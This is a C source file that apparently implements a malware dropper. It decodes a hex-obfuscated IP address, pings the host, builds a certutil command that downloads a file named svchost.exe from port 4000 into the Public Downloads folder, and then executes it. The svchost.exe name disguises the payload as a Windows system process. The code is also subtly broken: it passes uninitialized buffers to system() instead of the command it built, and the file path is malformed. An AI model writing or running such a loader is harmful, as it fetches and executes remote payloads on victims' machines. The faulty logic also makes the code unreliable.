#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void start(){
    int p = 4000; 
    char cl_2[256];
    
    char *wp = "C:\\Users\\Public\\Downloads";


    char hs[] = "31 32 37 2E 30 2E 30 2E 31"; 

    char d[50]; 
    int idx = 0; 
 
    char *t = strtok(hs, " "); 
    while (t != NULL) {
        d[idx++] = (char)strtol(t, NULL, 16);
        t = strtok(NULL, " ");
    }
    d[idx] = '\0';

    char v = printf("%s\n", d); 

    char si[256]; 

    char cl_1[256];
    
    sprintf(cl_1,"ping -n 1 %s > nul 2>&1",d); 

    int ch = system(cl_1);
    if (ch == 0){
        char cl[256];
        int md = system(cl_2);
            snprintf(si, sizeof(si), "certutil -urlcache -f -split http://%s:%d/svchost.exe %ssvchost.exe", d,p,wp);
            int gf = system(cl);
            if (gf == 0){
                char exec[256];

                sprintf(exec,
                    "\"%s\\svchost.exe\"",
                    wp);

                int exec_file = system(exec);
            }else{
                return;
            }
    }
    else{
        return;
    };
}

 int main(){
    start();
 };